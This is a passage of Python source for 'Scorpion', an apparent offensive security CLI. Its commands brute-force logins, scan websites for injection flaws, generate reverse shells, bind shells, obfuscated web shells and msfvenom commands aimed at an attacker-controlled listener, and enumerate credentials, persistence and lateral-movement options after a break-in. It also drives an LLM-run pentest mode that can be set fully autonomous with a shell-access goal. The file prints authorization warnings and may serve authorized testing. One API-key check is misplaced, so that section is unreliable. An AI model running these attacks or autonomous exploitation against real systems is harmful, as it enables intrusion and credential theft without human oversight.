                console.print(f"ERROR: Password file not found: {password_file}", style="red")
                raise typer.Exit(code=1)
        elif passwords:
            import os
            if os.path.exists(passwords):
                password_list = load_credentials_file(passwords)
                console.print(f"Loaded {len(password_list)} passwords from {passwords}", style="cyan")
            else:
                password_list = [p.strip() for p in passwords.split(",")]
        else:
            console.print("ERROR: Provide --pass, --passwords, or --password-file", style="red")
            raise typer.Exit(code=1)
        
        total_attempts = len(username_list) * len(password_list)
        
        console.print(f"\n[yellow]WARNING: Brute-force attacks can be illegal and unethical![/yellow]")
        console.print(f"[yellow]Only use this on systems you own or have written permission to test.[/yellow]\n")
        
        console.print(f"[cyan]Starting {auth_type.upper()} brute-force on {target}[/cyan]")
        console.print(f"Usernames: {len(username_list)} | Passwords: {len(password_list)} | Total attempts: {total_attempts}")
        console.print(f"Concurrency: {concurrency} | Timeout: {timeout}s | Stop on success: {stop_on_success}\n")
        
        # Initialize brute-forcer
        bruteforcer = AuthBruteForcer(
            target=target,
            concurrency=concurrency,
            timeout=timeout,
            delay=delay,
            verify_ssl=not insecure,
            stop_on_success=stop_on_success,
        )
        
        # Execute brute-force
        try:
            if auth_type == "basic":
                results = await bruteforcer.brute_force_basic_auth(username_list, password_list)
            elif auth_type == "form":
                results = await bruteforcer.brute_force_form(
                    username_list, password_list,
                    username_field=username_field,
                    password_field=password_field,
                    method=method,
                    success_indicator=success_string,
                    failure_indicator=failure_string,
                )
            elif auth_type == "json":
                results = await bruteforcer.brute_force_json_api(
                    username_list, password_list,
                    username_field=username_field,
                    password_field=password_field,
                    success_key=success_key,
                )
            else:
                console.print(f"ERROR: Invalid auth type: {auth_type}. Use: basic, form, json", style="red")
                raise typer.Exit(code=1)
        except Exception as e:
            console.print(f"ERROR during brute-force: {e}", style="red")
            raise typer.Exit(code=1)
        
        # Display results
        successful = [r for r in results if r.success]
        failed = [r for r in results if not r.success and not r.error]
        errors = [r for r in results if r.error]
        
        if successful:
            console.print(f"\n[green]✓ SUCCESS! Found {len(successful)} valid credential(s):[/green]\n", style="bold")
            
            table = Table(title="Valid Credentials", box=box.ROUNDED, border_style="green")
            table.add_column("Username", style="cyan")
            table.add_column("Password", style="yellow")
            table.add_column("Status", style="green")
            table.add_column("Time", style="magenta")
            
            for result in successful:
                table.add_row(
                    result.username,
                    "*" * len(result.password),  # Mask password in output
                    str(result.status_code),
                    f"{result.response_time:.2f}s",
                )
            
            console.print(table)
            console.print(f"\n[green]Valid credentials found! Check output file for details.[/green]")
        else:
            console.print(f"\n[red]✗ No valid credentials found[/red]")
        
        console.print(f"\nAttempts: {len(results)} | Success: {len(successful)} | Failed: {len(failed)} | Errors: {len(errors)}")
        
        # Save output
        if output:
            import json
            from dataclasses import asdict
            output_data = {
                "target": target,
                "auth_type": auth_type,
                "total_attempts": len(results),
                "successful": len(successful),
                "failed": len(failed),
                "errors": len(errors),
                "results": [asdict(r) for r in results],
            }
            with open(output, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            console.print(f"\nResults saved to: {output}", style="cyan")
    
    asyncio.run(run())


@app.command()
def webscan(
    target: str = typer.Argument(..., help="Target URL to scan (e.g., https://example.com)"),
    concurrency: int = typer.Option(10, "--concurrency", "-c", help="Number of concurrent requests"),
    timeout: float = typer.Option(15.0, "--timeout", "-t", help="Request timeout in seconds"),
    no_ssl_verify: bool = typer.Option(False, "--no-ssl-verify", help="Disable SSL certificate verification"),
    test_sqli: bool = typer.Option(True, "--test-sqli/--no-sqli", help="Scan for SQL injection"),
    test_xss: bool = typer.Option(True, "--test-xss/--no-xss", help="Scan for XSS"),
    test_cmdi: bool = typer.Option(True, "--test-cmdi/--no-cmdi", help="Scan for command injection"),
    test_ssrf: bool = typer.Option(True, "--test-ssrf/--no-ssrf", help="Scan for SSRF"),
    test_headers: bool = typer.Option(True, "--test-headers/--no-headers", help="Scan security headers"),
    test_cors: bool = typer.Option(True, "--test-cors/--no-cors", help="Scan CORS configuration"),
    severity_filter: Optional[str] = typer.Option(None, "--severity", "-s", help="Filter by severity (critical,high,medium,low,info)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save results to JSON file"),
):
    """
    Advanced web application vulnerability scanning.
    
    Scans for:
    - SQL Injection (error-based, time-based, boolean-based)
    - Cross-Site Scripting (XSS)
    - Command Injection
    - Server-Side Request Forgery (SSRF)
    - Security Headers (HSTS, CSP, X-Frame-Options, etc.)
    - CORS Misconfiguration
    
    Examples:
        # Full scan
        scorpion webscan https://example.com/page?id=1
        
        # Only scan for SQLi and XSS
        scorpion webscan https://example.com --no-cmdi --no-ssrf --no-headers --no-cors
        
        # Filter critical vulnerabilities only
        scorpion webscan https://example.com -s critical
        
        # Custom concurrency and timeout
        scorpion webscan https://example.com -c 20 -t 30
    
    WARNING: Only scan applications you have permission to scan!
    Unauthorized scanning is illegal and unethical.
    """
    
    console.print("\n[bold red]WARNING: Web Application Vulnerability Scanning[/bold red]")
    console.print("[yellow]Only scan applications you have explicit permission to scan.[/yellow]")
    console.print("[yellow]Unauthorized scanning may be illegal and unethical.[/yellow]\n")
    
    async def run():
        tester = AdvancedWebTester(
            target=target,
            concurrency=concurrency,
            timeout=timeout,
            verify_ssl=not no_ssl_verify,
        )
        
        console.print(f"[cyan]Target:[/cyan] {target}")
        console.print(f"[cyan]Concurrency:[/cyan] {concurrency}")
        console.print(f"[cyan]Timeout:[/cyan] {timeout}s\n")
        
        with console.status("[bold cyan]Running web application security tests...", spinner="dots"):
            findings = []
            
            # Parse URL and extract parameters
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(target)
            params = parse_qs(parsed.query)
            params_dict = {k: v[0] if v else "" for k, v in params.items()}
            
            if not params_dict:
                params_dict = {"id": "1", "page": "home"}
            
            connector = __import__('aiohttp').TCPConnector(limit=concurrency, ssl=not no_ssl_verify)
            async with __import__('aiohttp').ClientSession(connector=connector) as session:
                tasks = []
                
                if test_sqli:
                    tasks.append(tester.test_sql_injection(session, params_dict))
                if test_xss:
                    tasks.append(tester.test_xss(session, params_dict))
                if test_cmdi:
                    tasks.append(tester.test_command_injection(session, params_dict))
                if test_ssrf:
                    tasks.append(tester.test_ssrf(session, params_dict))
                if test_headers:
                    tasks.append(tester.test_security_headers(session))
                if test_cors:
                    tasks.append(tester.test_cors_misconfiguration(session))
                
                results = await asyncio.gather(*tasks)
                
                for result_list in results:
                    findings.extend(result_list)
        
        # Filter by severity if requested
        if severity_filter:
            severities = [s.strip().lower() for s in severity_filter.split(",")]
            findings = [f for f in findings if f.severity.lower() in severities]
        
        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        findings.sort(key=lambda x: severity_order.get(x.severity.lower(), 99))
        
        # Display results
        console.print(f"\n[bold]Found {len(findings)} vulnerabilities:[/bold]\n")
        
        if not findings:
            console.print("[green]✓ No vulnerabilities detected![/green]")
        else:
            # Group by severity
            by_severity = {}
            for finding in findings:
                sev = finding.severity.lower()
                if sev not in by_severity:
                    by_severity[sev] = []
                by_severity[sev].append(finding)
            
            # Display summary
            for sev in ["critical", "high", "medium", "low", "info"]:
                if sev in by_severity:
                    count = len(by_severity[sev])
                    color = {
                        "critical": "red",
                        "high": "orange1",
                        "medium": "yellow",
                        "low": "cyan",
                        "info": "blue",
                    }.get(sev, "white")
                    console.print(f"[{color}]● {sev.upper()}: {count}[/{color}]")
            
            console.print()
            
            # Display detailed findings
            for i, finding in enumerate(findings, 1):
                severity_color = {
                    "critical": "red",
                    "high": "orange1",
                    "medium": "yellow",
                    "low": "cyan",
                    "info": "blue",
                }.get(finding.severity.lower(), "white")
                
                panel_content = f"""[bold]Type:[/bold] {finding.vuln_type}
[bold]Severity:[/bold] [{severity_color}]{finding.severity.upper()}[/{severity_color}]
[bold]Confidence:[/bold] {finding.confidence}
[bold]URL:[/bold] {finding.url}
[bold]Parameter:[/bold] {finding.parameter or 'N/A'}
[bold]Method:[/bold] {finding.method}
[bold]Payload:[/bold] {finding.payload[:100]}{'...' if len(finding.payload) > 100 else ''}

[bold]Evidence:[/bold]
{finding.evidence}

[bold]Description:[/bold]
{finding.description}

[bold]Remediation:[/bold]
{finding.remediation}"""
                
                console.print(Panel(
                    panel_content,
                    title=f"[{severity_color}]Finding #{i}[/{severity_color}]",
                    border_style=severity_color,
                    box=box.ROUNDED,
                ))
                console.print()
        
        # Save to file if requested
        if output:
            from dataclasses import asdict
            output_data = {
                "target": target,
                "scan_time": datetime.datetime.now().isoformat(),
                "total_findings": len(findings),
                "by_severity": {
                    sev: len([f for f in findings if f.severity.lower() == sev])
                    for sev in ["critical", "high", "medium", "low", "info"]
                },
                "findings": [asdict(f) for f in findings],
            }
            with open(output, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            console.print(f"[cyan]Results saved to: {output}[/cyan]")
    
    asyncio.run(run())


@app.command()
def payload(
    lhost: str = typer.Option(..., "--lhost", "-l", help="Listener host IP (attacker machine)"),
    lport: int = typer.Option(4444, "--lport", "-p", help="Listener port"),
    payload_type: str = typer.Option("reverse_tcp", "--type", "-t", help="Payload type: reverse_tcp, bind_tcp, web_shell, powershell"),
    shell: str = typer.Option("bash", "--shell", "-s", help="Shell type: bash, python, powershell, netcat, php, perl, ruby"),
    platform: str = typer.Option("linux", "--platform", help="Target platform: linux, windows, unix, macos, web"),
    encoder: Optional[str] = typer.Option(None, "--encode", "-e", help="Encoder: base64, hex, url, ps_base64, all"),
    format: str = typer.Option("raw", "--format", "-f", help="Output format: raw, base64, hex, url, ps_base64"),
    obfuscate: bool = typer.Option(False, "--obfuscate", "-o", help="Obfuscate payload"),
    list_payloads: bool = typer.Option(False, "--list", help="List available payloads and exit"),
    msfvenom: bool = typer.Option(False, "--msfvenom", help="Generate msfvenom command instead of raw payload"),
    output: Optional[str] = typer.Option(None, "--output", help="Save payload to file"),
):
    """
    Generate exploitation payloads for penetration testing.
    Creates reverse shells, bind shells, web shells, and encoded payloads.
    """
    # Defer helpful guidance if optional module wasn't importable
    if PayloadGenerator is None:
        console.print("[red]Payload module not available in current environment.[/red]")
        console.print("[yellow]Fix on Parrot OS:[/yellow]")
        console.print("  1. Activate your venv: source .venv/bin/activate")
        console.print("  2. Refresh editable install: python -m pip install -e tools/python_scorpion")
        console.print("  3. Verify import:")
        console.print("     python -c \"from python_scorpion.payload_generator import PayloadGenerator; print('OK')\"")
        raise typer.Exit(1)

    generator = PayloadGenerator()
    
    # List available payloads
    if list_payloads:
        available = generator.list_available_payloads()
        
        console.print("[cyan]=== Available Payloads ===[/cyan]\n")
        
        for category, items in available.items():
            table = Table(title=category.replace("_", " ").title(), box=box.MINIMAL)
            table.add_column("Payload", style="green")
            for item in items:
                table.add_row(item)
            console.print(table)
            console.print()
        
        return
    
    # Generate msfvenom command
    if msfvenom:
        result = generator.generate_msfvenom_command(
            payload_type=payload_type,
            lhost=lhost,
            lport=lport,
            platform=platform,
            arch="x64",
            format=format if format != "raw" else "exe"
        )
        
        console.print("[cyan]=== Msfvenom Payload Generator ===[/cyan]\n")
        console.print(f"[yellow]Platform:[/yellow] {result['platform']}")
        console.print(f"[yellow]Architecture:[/yellow] {result['arch']}")
        console.print(f"[yellow]Payload:[/yellow] {result['payload']}")
        console.print(f"[yellow]Format:[/yellow] {result['format']}\n")
        
        console.print("[cyan]=== Generation Command ===[/cyan]")
        console.print(f"[green]{result['command']}[/green]\n")
        
        console.print("[cyan]=== Listener Setup ===[/cyan]")
        console.print(f"[yellow]{result['listener']}[/yellow]\n")
        
        if output:
            with open(output, "w") as f:
                f.write(f"# {result['description']}\n\n")
                f.write(f"# Generation Command:\n{result['command']}\n\n")
                f.write(f"# Listener:\n{result['listener']}\n")
            console.print(f"[green]Commands saved to: {output}[/green]")
        
        return
    
    # Generate payload based on type
    try:
        if payload_type in ["reverse_tcp", "reverse_shell"]:
            payload_obj = generator.generate_reverse_shell(
                lhost=lhost,
                lport=lport,
                shell_type=shell,
                encoder=encoder
            )
        
        elif payload_type == "bind_tcp":
            payload_obj = generator.generate_bind_shell(
                lport=lport,
                shell_type=shell
            )
        
        elif payload_type == "web_shell":
            payload_obj = generator.generate_web_shell(
                shell_type=shell,
                obfuscate=obfuscate
            )
        
        elif payload_type == "powershell":
            payload_obj = generator.generate_powershell_payload(
                lhost=lhost,
                lport=lport,
                encoder="base64"
            )
        
        else:
            console.print(f"[red]Unknown payload type: {payload_type}[/red]")
            console.print("[yellow]Available types: reverse_tcp, bind_tcp, web_shell, powershell[/yellow]")
            raise typer.Exit(1)
        
        # Display payload information
        console.print("[cyan]=== Payload Generated ===[/cyan]\n")
        console.print(f"[yellow]Type:[/yellow] {payload_obj.type}")
        console.print(f"[yellow]Platform:[/yellow] {payload_obj.platform}")
        console.print(f"[yellow]Description:[/yellow] {payload_obj.description}\n")
        
        console.print("[cyan]=== Payload Code ===[/cyan]")
        console.print(Panel(payload_obj.code, border_style="green", box=box.ROUNDED))
        console.print()
        
        # Show encoded versions if available
        if payload_obj.encoded:
            console.print("[cyan]=== Encoded Versions ===[/cyan]")
            for enc_type, enc_value in payload_obj.encoded.items():
                if len(enc_value) > 200:
                    enc_display = enc_value[:200] + "..."
                else:
                    enc_display = enc_value
                console.print(f"\n[yellow]{enc_type.upper()}:[/yellow]")
                console.print(f"[dim]{enc_display}[/dim]")
            console.print()
        
        console.print("[cyan]=== Usage Instructions ===[/cyan]")
        console.print(f"[yellow]{payload_obj.usage}[/yellow]\n")
        
        # Save to file if requested
        if output:
            with open(output, "w") as f:
                f.write(f"# {payload_obj.description}\n")
                f.write(f"# Platform: {payload_obj.platform}\n")
                f.write(f"# Type: {payload_obj.type}\n\n")
                f.write(f"# Usage:\n# {payload_obj.usage}\n\n")
                f.write(f"# Payload:\n{payload_obj.code}\n")
                
                if payload_obj.encoded:
                    f.write(f"\n# Encoded versions:\n")
                    for enc_type, enc_value in payload_obj.encoded.items():
                        f.write(f"\n# {enc_type.upper()}:\n")
                        f.write(f"{enc_value}\n")
            
            console.print(f"[green]Payload saved to: {output}[/green]")
        
        # Security warning
        console.print("[red]WARNING:[/red] Only use payloads on systems you own or have explicit permission to test.")
        console.print("[yellow]Unauthorized use may violate computer fraud laws.[/yellow]")
    
    except Exception as e:
        console.print(f"[red]Error generating payload: {e}[/red]")
        raise typer.Exit(1)


# @app.command()  # Disabled - api_security module removed in Phase 1 optimization
def api_security(
    target: str = typer.Option(..., "--target", "-t", help="API base URL (e.g., https://api.example.com)"),
    openapi_spec: Optional[str] = typer.Option(None, "--spec", help="OpenAPI/Swagger spec URL"),
    jwt_token: Optional[str] = typer.Option(None, "--jwt", help="JWT token to test"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save results to JSON file"),
):
    """
    🔐 Comprehensive API Security Testing
    
    NOTE: This command is disabled - api_security module removed in Phase 1 optimization.
    Use 'scorpion ai-pentest' with -g api_security_testing goal instead.
    
    Tests REST/GraphQL/gRPC APIs for vulnerabilities:
    - Authentication bypass & default credentials
    - JWT security (alg:none, weak keys, sensitive data)
    - IDOR (Insecure Direct Object Reference)
    - GraphQL introspection & DoS
    - Rate limiting
    - Mass assignment
    """
    console.print("[red]Error: This command is currently disabled.[/red]")
    console.print("[yellow]API security testing integrated into AI pentesting.[/yellow]")
    console.print("[cyan]Use: scorpion ai-pentest -t <api-url> -g api_security_testing -r high[/cyan]")
    return
    
    async def run():
        # async with APISecurityTester(target) as tester:  # Removed in Phase 1
            try:
                results = await tester.run_full_assessment(openapi_spec, jwt_token)
                
                # Display summary
                console.print(f"\n[cyan]{'=' * 60}[/cyan]")
                console.print(f"[bold green]API Security Assessment Complete[/bold green]")
                console.print(f"[cyan]{'=' * 60}[/cyan]\n")
                
                console.print(f"[yellow]Target:[/yellow] {results['target']}")
                console.print(f"[yellow]Endpoints:[/yellow] {results['endpoints_discovered']}")
                console.print(f"[yellow]Total Findings:[/yellow] {results['total_findings']}\n")
                
                # Severity breakdown
                severity = results['severity_counts']
                console.print(f"[red]  Critical:[/red] {severity['critical']}")
                console.print(f"[red]  High:[/red] {severity['high']}")
                console.print(f"[yellow]  Medium:[/yellow] {severity['medium']}")
                console.print(f"[blue]  Low:[/blue] {severity['low']}")
                console.print(f"[cyan]  Info:[/cyan] {severity['info']}\n")
                
                # Display findings
                if results['findings']:
                    console.print(f"[bold]Findings:[/bold]\n")
                    for i, finding in enumerate(results['findings'][:10], 1):
                        console.print(f"[{i}] [{finding['severity'].upper()}] {finding['description']}")
                        console.print(f"    Endpoint: {finding['endpoint']}")
                        console.print(f"    Evidence: {finding['evidence'][:100]}")
                        console.print(f"    Fix: {finding['remediation'][:100]}\n")
                
                # Save to file
                if output:
                    with open(output, 'w') as f:
                        json.dump(results, f, indent=2)
                    console.print(f"[green]Results saved to: {output}[/green]")
                
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")
                raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def db_pentest(
    target: str = typer.Option(..., "--target", "-t", help="Target URL with parameter (e.g., https://site.com/page?id=1)"),
    param: str = typer.Option("id", "--param", "-p", help="Parameter name to test"),
    method: str = typer.Option("GET", "--method", "-m", help="HTTP method (GET/POST)"),
    db_type: Optional[str] = typer.Option(None, "--db-type", help="Database type (mysql, postgresql, mssql, oracle, mongodb)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save results to JSON file"),
):
    """
    🗃️  Database Penetration Testing
    
    Tests for SQL/NoSQL injection vulnerabilities:
    - Error-based SQL injection
    - Boolean-based blind SQL injection  
    - Time-based blind SQL injection
    - UNION-based SQL injection
    - NoSQL injection (MongoDB, etc.)
    - Database fingerprinting
    - Privilege escalation checks
    """
    
    async def run():
        tester = DatabasePentester(target)
        
        try:
            results = await tester.run_full_assessment(param, method.upper())
            
            # Save to file
            if output:
                with open(output, 'w') as f:
                    json.dump(results, f, indent=2)
                console.print(f"\n[green]Results saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def post_exploit(
    os_type: Optional[str] = typer.Option(None, "--os", help="Operating system (linux, darwin)"),
    execute: bool = typer.Option(False, "--execute", "-e", help="Execute enumeration commands (USE WITH CAUTION!)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save results to JSON file"),
):
    """
    🔓 Post-Exploitation Enumeration
    
    ⚠️  WARNING: Only use on systems you own or have authorization to test!
    
    Provides enumeration commands for:
    - Privilege escalation vectors (SUID, sudo, kernel exploits)
    - Credential harvesting (files, history, SSH keys)
    - Persistence mechanisms (cron, SSH keys)
    - Lateral movement (network scanning, pivoting)
    
    Linux/macOS checks: SUID binaries, sudo, writable /etc/passwd, kernel exploits
    """
    
    async def run():
        post_ex = PostExploitation(os_type)
        
        try:
            console.print("[red]⚠️  WARNING: Only use on authorized systems![/red]\n")
            
            results = await post_ex.run_full_enumeration(execute_commands=execute)
            
            # Display summary
            console.print(f"\n[cyan]{'=' * 60}[/cyan]")
            console.print(f"[bold green]Post-Exploitation Enumeration Complete[/bold green]")
            console.print(f"[cyan]{'=' * 60}[/cyan]\n")
            
            console.print(f"[yellow]Privilege Escalation Checks:[/yellow] {len(results['privilege_escalation'])}")
            console.print(f"[yellow]Persistence Techniques:[/yellow] {len(results['persistence'])}")
            console.print(f"[yellow]Lateral Movement Techniques:[/yellow] {len(results['lateral_movement'])}\n")
            
            # Show sample commands
            if results['privilege_escalation']:
                console.print(f"[bold]Sample Privilege Escalation Commands:[/bold]")
                for check in results['privilege_escalation'][:3]:
                    console.print(f"\n[green]{check['description']}[/green]")
                    for cmd in check['commands'][:2]:
                        console.print(f"  $ {cmd}")
            
            # Save to file
            if output:
                with open(output, 'w') as f:
                    json.dump(results, f, indent=2)
                console.print(f"\n[green]Results saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def ci_scan(
    input_file: str = typer.Option(..., "--input", "-i", help="Input JSON file from previous scan"),
    fail_on_critical: bool = typer.Option(True, "--fail-on-critical", help="Fail build on critical findings"),
    fail_on_high: bool = typer.Option(False, "--fail-on-high", help="Fail build on high severity findings"),
    max_medium: int = typer.Option(10, "--max-medium", help="Maximum allowed medium severity findings"),
    sarif_output: Optional[str] = typer.Option(None, "--sarif-output", help="Generate SARIF report for GitHub Security"),
    junit_output: Optional[str] = typer.Option(None, "--junit-output", help="Generate JUnit XML for test reporting"),
    generate_workflow: Optional[str] = typer.Option(None, "--generate-workflow", help="Generate CI config (github, gitlab, jenkins)"),
):
    """
    🔄 CI/CD Integration & Security Gates
    
    Integrates Scorpion scans into CI/CD pipelines:
    - SARIF output for GitHub Security tab
    - JUnit XML for test reporting
    - Configurable failure thresholds
    - Workflow generation (GitHub Actions, GitLab CI, Jenkins)
    
    Examples:
      # Check thresholds and fail build if needed
      scorpion ci-scan --input api-results.json --fail-on-critical --fail-on-high
      
      # Generate SARIF for GitHub
      scorpion ci-scan --input api-results.json --sarif-output scorpion.sarif
      
      # Generate GitHub Actions workflow
      scorpion ci-scan --generate-workflow github > .github/workflows/security.yml
    """
    
    if generate_workflow:
        ci = CICDIntegration()
        if generate_workflow == 'github':
            print(ci.generate_github_actions_workflow())
        elif generate_workflow == 'gitlab':
            print(ci.generate_gitlab_ci_config())
        elif generate_workflow == 'jenkins':
            print(ci.generate_jenkins_pipeline())
        else:
            console.print(f"[red]Unknown CI platform: {generate_workflow}[/red]")
            console.print("[yellow]Supported: github, gitlab, jenkins[/yellow]")
            raise typer.Exit(1)
        return
    
    # Run CI scan
    exit_code = asyncio.run(run_ci_scan(
        input_file,
        fail_on_critical,
        fail_on_high,
        max_medium,
        sarif_output,
        junit_output
    ))
    
    raise typer.Exit(exit_code)


@app.command("ai-pentest")
def ai_pentest_command(
    # Target Configuration
    target: str = typer.Option(..., "--target", "-t", help="Target host/domain for AI penetration test"),
    
    # Testing Goals & Strategy
    primary_goal: str = typer.Option(
        "comprehensive_assessment",
        "--primary-goal", "-g",
        help="Primary objective (comprehensive_assessment, privilege_escalation, data_access, network_mapping, web_exploitation, gain_shell_access, vulnerability_discovery, infrastructure_assessment, cloud_security_audit, api_security_testing)"
    ),
    secondary_goals: str = typer.Option(
        "",
        "--secondary-goals",
        help="Comma-separated secondary goals (e.g., 'data_access,network_mapping')"
    ),
    time_limit: int = typer.Option(120, "--time-limit", help="Maximum test duration in minutes"),
    max_iterations: int = typer.Option(20, "--max-iterations", help="Maximum testing iterations (default: 20 for thorough exploitation)"),
    
    # AI Configuration
    ai_provider: str = typer.Option(
        "openai",
        "--ai-provider",
        help="AI provider (auto-detected from API key): openai (GPT-4/3.5), anthropic (Claude), github (GitHub Models - FREE), custom (OpenAI-compatible API)"
    ),
    model: str = typer.Option(
        "gpt-4",
        "--model",
        help="AI model: gpt-4, gpt-4o, gpt-4o-mini, gpt-3.5-turbo, claude-3-opus-20240229, claude-3-sonnet-20240229, etc."
    ),
    api_key: Optional[str] = typer.Option(
        None,
        "--api-key",
        help="AI API key (or set SCORPION_AI_API_KEY environment variable)"
    ),
    api_endpoint: Optional[str] = typer.Option(
        None,
        "--api-endpoint",
        help="Custom API endpoint (for custom provider, e.g., local LLM server)"
    ),
    
    # Testing Behavior
    stealth_level: str = typer.Option(
        "moderate",
        "--stealth-level", "-s",
        help="Stealth level: low (fast/noisy), moderate (balanced), high (slow/stealthy)"
    ),
    autonomy: str = typer.Option(
        "semi_autonomous",
        "--autonomy", "-a",
        help="Autonomy level: supervised (confirm each action), semi_autonomous (confirm high-risk), fully_autonomous (no confirmation - DANGEROUS)"
    ),
    risk_tolerance: str = typer.Option(
        "medium",
        "--risk-tolerance", "-r",
        help="Risk tolerance: low (passive only), medium (active scanning), high (exploitation - requires authorization)"
    ),
    
    # Advanced Options
    learning_mode: bool = typer.Option(False, "--learning-mode", help="Enable AI learning mode (experimental)"),
    custom_instructions: Optional[str] = typer.Option(
        None,
        "--instructions", "-i",
        help="Custom instructions/prompt to guide AI behavior (e.g., 'Focus on API endpoints', 'Test for IDOR vulnerabilities')"
    ),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON file for detailed results"),
):
    """
    🤖 AI-Powered Autonomous Penetration Testing
    
    Uses Large Language Models (LLMs) to intelligently orchestrate security testing.
    The AI analyzes findings in real-time and autonomously determines the optimal
    next actions to achieve your security testing goals.
    
    \b
    ⚠️  CRITICAL WARNING:
    • Only test systems you OWN or have EXPLICIT WRITTEN AUTHORIZATION to test
    • Unauthorized penetration testing is ILLEGAL and may result in:
      - Criminal prosecution
      - Significant fines
      - Imprisonment
    
    \b
    🎯 Primary Goals:
    • comprehensive_assessment  - Full security assessment (default)
    • privilege_escalation      - Find privilege escalation paths
    • data_access              - Identify data access vulnerabilities
    • network_mapping          - Map network topology and services
    • web_exploitation         - Focus on web application vulnerabilities
    • gain_shell_access        - Attempt to gain shell access
    • vulnerability_discovery  - Discover as many vulnerabilities as possible
    • infrastructure_assessment - Assess infrastructure security
    • cloud_security_audit     - Cloud security assessment
    • api_security_testing     - API security testing
    
    \b
    📖 Examples:
    
      # Basic AI pentest with OpenAI GPT-4
      scorpion ai-pentest -t example.com --api-key sk-...
      
      # Using GitHub Models (FREE) with GPT-4o-mini
      scorpion ai-pentest -t example.com --ai-provider github \\
        --api-key ghp_... --model gpt-4o-mini
      
      # Simplified - just set API key and run (auto-detects provider!)
      export SCORPION_AI_API_KEY=ghp_...
      scorpion ai-pentest -t example.com
      
      # Comprehensive assessment with high stealth
      scorpion ai-pentest -t example.com --api-key sk-... -g comprehensive_assessment -s high
      
      # Web exploitation focus with Anthropic Claude
      scorpion ai-pentest -t example.com --ai-provider anthropic --api-key sk-ant-... \\
        --model claude-3-opus-20240229 -g web_exploitation
      
      # Custom OpenAI-compatible endpoint (local LLM)
      scorpion ai-pentest -t example.com --ai-provider custom \\
        --api-endpoint http://localhost:1234/v1/chat/completions --api-key local
      
      # High-risk exploitation mode (requires written authorization!)
      scorpion ai-pentest -t example.com --api-key sk-... -r high -a fully_autonomous \\
        -g gain_shell_access --time-limit 60
      
      # Custom instructions to guide AI behavior
      scorpion ai-pentest -t example.com -i "Focus on API endpoints and test for IDOR vulnerabilities"
      
      # Multiple custom guidance examples
      scorpion ai-pentest -t example.com -i "Test GraphQL endpoints for injection attacks"
      scorpion ai-pentest -t example.com -i "Prioritize authentication bypass and JWT vulnerabilities"
      scorpion ai-pentest -t example.com -i "Look for SSRF in file upload features and image processing"
      scorpion ai-pentest -t example.com -i "Focus on subdomain enumeration and takeover vulnerabilities"
    
    \b
    🔑 API Key Setup:
      # Linux/macOS
      export SCORPION_AI_API_KEY='your-api-key-here'
      
      # Windows PowerShell
      $env:SCORPION_AI_API_KEY='your-api-key-here'
      
      # Or use --api-key flag
      scorpion ai-pentest -t example.com --api-key your-api-key-here
    
    \b
    📊 How It Works:
    1. AI analyzes the target and primary goal
    2. AI selects and orchestrates appropriate Scorpion tools
    3. AI analyzes results and adapts strategy dynamically
    4. AI continues until goal achieved or time limit reached
    5. Comprehensive report generated with findings and recommendations
    
    \b
    🛡️  Safety Features:
    • Supervised mode: Confirms each action before execution
    • Semi-autonomous mode: Confirms high-risk actions only (default)
    • Risk tolerance controls: Prevents exploitation without authorization
    • Time limits: Prevents runaway testing
    • Detailed logging: Full audit trail of AI decisions and actions
    """
    
    # Legal/ethical warning
    console.print("\n[red]═══════════════════════════════════════════════════════════════[/red]")
    console.print("[red]                      ⚠️  LEGAL WARNING ⚠️                        [/red]")
    console.print("[red]═══════════════════════════════════════════════════════════════[/red]")
    console.print("[yellow]AI-powered penetration testing is POWERFUL and potentially DANGEROUS.[/yellow]")
    console.print("[yellow]You MUST have explicit written authorization to test the target system.[/yellow]")
    console.print("[yellow]Unauthorized access is illegal and may result in:[/yellow]")
    console.print("[yellow]  • Criminal prosecution[/yellow]")
    console.print("[yellow]  • Significant fines[/yellow]")
    console.print("[yellow]  • Imprisonment[/yellow]")
    console.print("[red]═══════════════════════════════════════════════════════════════[/red]\n")
    
    # Get API key from env if not provided (auto-discover across common vars)
    api_key_source = None
    if not api_key:
        # Preferred env var
        api_key = os.getenv("SCORPION_AI_API_KEY")
        if api_key:
            api_key_source = "SCORPION_AI_API_KEY"
        # Fallbacks: pick the first available
        if not api_key:
            env_candidates = [
                ("GITHUB_TOKEN", os.getenv("GITHUB_TOKEN")),
                ("GITHUB_PAT", os.getenv("GITHUB_PAT")),
                ("OPENAI_API_KEY", os.getenv("OPENAI_API_KEY")),
                ("ANTHROPIC_API_KEY", os.getenv("ANTHROPIC_API_KEY")),
            ]
            for name, value in env_candidates:
                if value:
                    api_key = value
                    api_key_source = name
                    console.print(f"[cyan]✓ Found API key in {name}[/cyan]")
                    break
    else:
        api_key_source = "--api-key flag"
    
    # Show success message if API key was found from environment
    if api_key and api_key_source and api_key_source != "--api-key flag":
        console.print(f"[green]✓ API key loaded from {api_key_source}[/green]")
        console.print(f"[dim]  Key preview: {api_key[:15]}...{api_key[-4:]} ({len(api_key)} chars)[/dim]\n")
        if not api_key:
            console.print("[red]ERROR: AI API key required.[/red]")
            console.print("[yellow]✨ Setup your API key ONCE, then use AI commands anytime![/yellow]\n")
            
            console.print("[cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/cyan]")
            console.print("[green bold]📖 ONE-TIME SETUP (Recommended)[/green bold]")
            console.print("[cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/cyan]\n")
            
            console.print("[white]1. Get a REAL token from GitHub (starts with ghp_):[/white]")
